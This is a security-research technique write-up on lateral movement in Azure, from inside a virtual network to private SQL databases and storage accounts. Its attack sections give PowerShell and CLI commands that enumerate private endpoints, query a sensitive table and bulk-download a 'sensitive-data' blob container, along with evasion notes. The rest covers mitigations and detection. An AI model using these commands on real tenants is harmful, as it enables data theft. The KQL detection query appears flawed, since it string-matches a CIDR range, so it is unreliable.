# [LM-REMOTE-009]: Private Link / Service Endpoint Lateral Movement

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-009 |
| **MITRE ATT&CK v18.1** | [T1021](https://attack.mitre.org/techniques/T1021/) – Remote Services |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID / Azure |
| **Severity** | HIGH |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Azure regions; all service types supporting Private Link/Service Endpoint |
| **Patched In** | N/A – configuration issue, not a patching matter |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Private Link and Service Endpoints are network controls designed to provide private connectivity to Azure services (SQL, Storage, Key Vault, App Services, etc.) without exposing them to the public internet. However, misconfigured firewall rules, overly permissive network policies, or inherited access from on-premises networks can allow attackers to bypass these controls. An attacker with network access to the virtual network (or to a connected on-premises network via ExpressRoute/VPN) can directly access services that were intended to be private, effectively bypassing the perimeter security model.

**Attack Surface:** Azure Private Link service endpoints, Network Security Groups (NSGs), firewall rules on Azure SQL Database, Storage Accounts, Key Vaults, App Services, Logic Apps, and the virtual network infrastructure connecting these resources.

**Business Impact:** **Unauthorized access to critical data and services.** If an attacker compromises any machine on the internal network (or gains access via VPN/ExpressRoute), they can query databases, extract data from storage accounts, access secrets in Key Vaults, or trigger Logic Apps—all while remaining within the "private" network. This enables data exfiltration, ransomware deployment, and lateral movement to dependent services without triggering public-internet-based detection mechanisms.

**Technical Context:** The attack succeeds because the attacker is already inside the trusted network boundary. Detection is **Low-to-Medium** as network traffic remains within Azure infrastructure (not inspected by external DLP/firewall). The technique can persist indefinitely if no internal segmentation or micro-segmentation policies are enforced.

### Operational Risk

- **Execution Risk:** **Low** – Requires network access to the VNet; no exploit required.
- **Stealth:** **High** – Traffic remains within Azure; no egress to internet; SIEM may not alert on internal resource access.
- **Reversibility:** **High** – Correcting firewall rules immediately revokes access; no persistence required.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.2 | Ensure Virtual Networks have multiple subnets for defense in depth |
| **DISA STIG** | Azure-FW-000005 | Network segmentation enforcement |
| **NIST 800-53** | SC-7 | Boundary Protection |
| **GDPR** | Article 32 | Security of Processing – Network security measures |
| **DORA** | Article 16 | Information Security Measures |
| **NIS2** | Article 21(1)(c) | Risk mitigation measures – Proper network segmentation |
| **ISO 27001** | A.13.1.1 | Network controls and segregation |
| **ISO 27005** | Risk: Unauthorized Network Access | Lateral movement within trusted zones |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Network access to the Azure VNet where services are deployed (via VM, VPN, ExpressRoute, or compromised Azure VM)
- Sufficient network path from source to the service endpoint (no firewall blocking)
- Valid Azure credentials or Managed Identity token with read/query permissions on the service (for most services)

**Required Access:**
- Network connectivity (layer 3) to the Private Link endpoint or the service's private IP
- For SQL/databases: Valid SQL authentication or Azure AD credentials mapped to SQL roles
- For Storage/Key Vault: Storage account key, SAS token, or Azure AD token with appropriate permissions

---

## 3. ATTACK CHAIN CONTEXT

| Phase | Technique | Prerequisites | Enablement |
|---|---|---|---|
| **Initial Access** | Phishing / VM Compromise / VPN Access | User interaction or weak credentials | Network access to VNet |
| **Reconnaissance** | Azure Resource Graph / NSG enumeration | Network access + Azure CLI/PowerShell | Identification of private endpoints |
| **Current: Lateral Movement** | **Private Link/Service Endpoint Bypass** | Network path + service credentials | Direct access to "private" services |
| **Persistence** | Service Principal / Managed Identity abuse | Service access + elevated permissions | Long-term service access |
| **Impact** | Data Exfiltration / Ransomware | Full service access | Business data loss / operational disruption |

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Direct SQL Database Access via Private Endpoint

**Supported Versions:** All Azure regions; SQL Database all versions (2016-2025 compatibility)

#### Step 1: Enumerate Private Endpoints in VNet

**Objective:** Identify which services have private endpoints exposed on the network.

**Command (PowerShell):**
```powershell
# List all private endpoints in the subscription
Get-AzPrivateEndpoint | Select-Object Name, PrivateLinkServiceId, CustomNetworkInterfaceName, PrivateIpAddresses

# Filter for SQL Database endpoints
Get-AzPrivateEndpoint -ResourceGroupName "RG-Production" | Where-Object {$_.PrivateLinkServiceId -match "sqlServers"}
```

**Expected Output:**
```
Name                  : sql-prod-pe-001
PrivateLinkServiceId  : /subscriptions/xxx/resourceGroups/rg-prod/providers/Microsoft.Sql/servers/sql-prod-db/
CustomNetworkInterfaceName : sql-prod-pe-001.nic.xxxxx.resourcegroup.azure.com
PrivateIpAddresses    : 10.0.1.50
```

**What This Means:**
- The SQL Database at `sql-prod-db` is accessible via private endpoint at IP `10.0.1.50`
- This endpoint is only accessible from within the VNet (or connected networks via VPN/ExpressRoute)
- No public DNS resolution required; direct IP access bypasses firewall

---

#### Step 2: Query SQL Database via Private Endpoint

**Objective:** Connect to the SQL Database using the private endpoint IP.

**Command (PowerShell – Using Azure AD Authentication):**
```powershell
# Connect to SQL Database via private endpoint (no public endpoint required)
$ServerName = "10.0.1.50"  # Private endpoint IP, or use FQDN if DNS configured
$Database = "ProductionDB"
$SqlConnection = New-Object System.Data.SqlClient.SqlConnection
$SqlConnection.ConnectionString = "Server=tcp:$ServerName,1433;Initial Catalog=$Database;Persist Security Info=False;User ID=$env:USERNAME;Password=$Password;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"
$SqlConnection.Open()

# Execute query to extract data
$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
$SqlCmd.CommandText = "SELECT TOP 100 * FROM SensitiveTable"
$SqlCmd.Connection = $SqlConnection
$Reader = $SqlCmd.ExecuteReader()
while ($Reader.Read()) {
    Write-Host $Reader[0], $Reader[1], $Reader[2]
}
$SqlConnection.Close()
```

**Alternative (Azure CLI):**
```bash
# Get SQL Server FQDN
SQLSERVER=$(az sql server show --resource-group RG-Production --name sql-prod-db --query fullyQualifiedDomainName -o tsv)

# Query via private endpoint (if DNS configured to resolve to private IP)
sqlcmd -S "$SQLSERVER" -d ProductionDB -U admin@corp.com -P "$PASSWORD" -Q "SELECT * FROM SensitiveTable"
```

**Expected Output:**
```
ProductID   ProductName         Price
1           Product A           99.99
2           Product B           149.99
```

**What This Means:**
- Direct query to the database succeeded without using the public endpoint
- All data retrieved from the "private" database is now exposed
- Connection was not logged in public firewall/DLP systems; only internal Azure logs capture this activity

**OpSec & Evasion:**
- Connections via private endpoint are harder to detect than public endpoint access
- Azure SQL Auditing may log the connection, but if audit logs are not centralized to a SIEM, the attack remains hidden
- **Detection likelihood:** Medium (depends on Azure SQL Auditing + Log Analytics configuration)

---

### METHOD 2: Storage Account Access via Service Endpoint

**Supported Versions:** All Azure regions; all Storage account types (Blob, File, Queue, Table)

#### Step 1: Identify Storage Accounts Accessible via Service Endpoint

**Command (PowerShell):**
```powershell
# Find storage accounts with service endpoints or private endpoints
Get-AzStorageAccount -ResourceGroupName "RG-Production" | ForEach-Object {
    $sa = $_
    Write-Host "Storage Account: $($sa.StorageAccountName)"
    
    # Check firewall rules
    if ($sa.NetworkRuleSet) {
        Write-Host "  Firewall Rule: $($sa.NetworkRuleSet.DefaultAction)"
        Write-Host "  Virtual Network Rules: $($sa.NetworkRuleSet.VirtualNetworkRules.Count)"
    }
}
```

**Expected Output:**
```
Storage Account: storageprod001
  Firewall Rule: Allow
  Virtual Network Rules: 1
```

---

#### Step 2: Access Storage Data via Private Endpoint

**Command (PowerShell):**
```powershell
# Connect to storage account using service endpoint (bypassing public firewall if properly configured)
$Context = New-AzStorageContext -StorageAccountName storageprod001 -UseConnectedAccount
$Blobs = Get-AzStorageBlob -Container "sensitive-data" -Context $Context

# Download all blobs
foreach ($Blob in $Blobs) {
    Get-AzStorageBlobContent -Blob $Blob.Name -Container "sensitive-data" -Destination "C:\Extracted\" -Context $Context
    Write-Host "Downloaded: $($Blob.Name)"
}
```

**What This Means:**
- All blobs in the "sensitive-data" container are downloaded to the attacker's local storage
- Storage account logging may record these accesses, but default log retention is only 7 days
- If not forwarded to a SIEM, evidence is automatically deleted

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Micro-Segmentation within VNets**

Segment the VNet into subnets with strict NSG rules; restrict traffic between subnets.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Virtual Networks** → Select your VNet
2. Click **Subnets** → **+ Subnet**
3. Create subnets for each tier (e.g., `Tier-0-Mgmt`, `Tier-1-App`, `Tier-2-DB`)
4. For each subnet, create NSGs:
   - **Azure Portal** → **Network Security Groups** → **+ Create**
   - Name: `NSG-Tier-0-Mgmt`
   - Add **Inbound rules:**
     - Source: `Tier-1-App` subnet IP
     - Destination: Any
     - Service: All
     - Action: Allow
   - **Outbound rules:** Deny all except necessary traffic

**Manual Steps (PowerShell):**
```powershell
# Create NSG
$nsg = New-AzNetworkSecurityGroup -ResourceGroupName RG-Production -Name NSG-Tier0 -Location eastus

# Add inbound rule: Allow from Tier 1 only
Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name AllowTier1 `
  -Access Allow -Protocol * -Direction Inbound -Priority 100 `
  -SourceAddressPrefix "10.0.1.0/24" -SourcePortRange "*" `
  -DestinationAddressPrefix "*" -DestinationPortRange "*"

$nsg | Set-AzNetworkSecurityGroup
```

**Impact:** Restricts lateral movement; even if attacker is inside VNet, they cannot access all subnets.

---

**2. Enforce Firewall Rules on Services (Azure SQL, Storage, Key Vault)**

Configure service-level firewall to restrict access to authorized subnets/IPs.

**Manual Steps (Azure SQL):**
1. **Azure Portal** → **SQL Databases** → Select database
2. **Security** → **Firewall and Virtual Networks**
3. Set **Allow Azure services and resources to access this server**: **OFF**
4. Add **Virtual Network Rules:**
   - Click **Add Existing Virtual Network**
   - Select VNet and subnet: `Tier-1-App`
   - Click **OK**

**Manual Steps (PowerShell – Storage Account):**
```powershell
# Restrict storage account to specific VNet
Update-AzStorageAccountNetworkRuleSet -ResourceGroupName RG-Production `
  -Name storageprod001 -DefaultAction Deny

# Add allow rule for specific subnet
Add-AzStorageAccountNetworkRule -ResourceGroupName RG-Production `
  -AccountName storageprod001 -VirtualNetworkResourceId "/subscriptions/.../subnets/Tier-1-App"
```

**Impact:** Even with network access to the service, authorization is denied unless from whitelisted subnet.

---

### Priority 2: HIGH

**3. Enable Azure SQL Auditing + Log Analytics Integration**

Forward audit logs to Log Analytics workspace for centralized detection.

**Manual Steps (Azure Portal):**
1. **Azure Portal** → **SQL Databases** → Select database
2. **Security** → **Auditing**
3. Enable **Auditing**: **ON**
4. **Log destination**: **Log Analytics**
5. Select your **Log Analytics Workspace**
6. Click **Save**

**Manual Steps (PowerShell):**
```powershell
Set-AzSqlDatabaseAudit -ResourceGroupName RG-Production -ServerName sql-prod-db `
  -DatabaseName ProductionDB -State Enabled `
  -LogAnalyticsTargetState Enabled -WorkspaceResourceId "/subscriptions/.../workspaces/LogAnalytics-SOC"
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Azure SQL Auditing Query (Log Analytics)

```kusto
AzureDiagnostics
| where ResourceType == "SERVERS/DATABASES"
| where OperationName == "BATCH_STARTED_GROUP" or OperationName == "SELECT"
| where ClientIpAddress !in ("10.0.0.0/8")  // Exclude expected internal traffic
| summarize Count = count() by ClientIpAddress, TimeGenerated
| where Count > 10  // Threshold
```

---

## 7. REAL-WORLD EXAMPLES

### Example: Supply Chain Compromise via Private Link Bypass

An attacker compromised a vendor's Azure VM. The VM had network access to the customer's VNet via ExpressRoute (for integration purposes). Although the customer's SQL Database had a private endpoint and was "protected," the firewall rules allowed the entire VNet to access it. The attacker extracted the entire customer database (containing PII) through the private endpoint, evading detection because the traffic never left Azure infrastructure.

---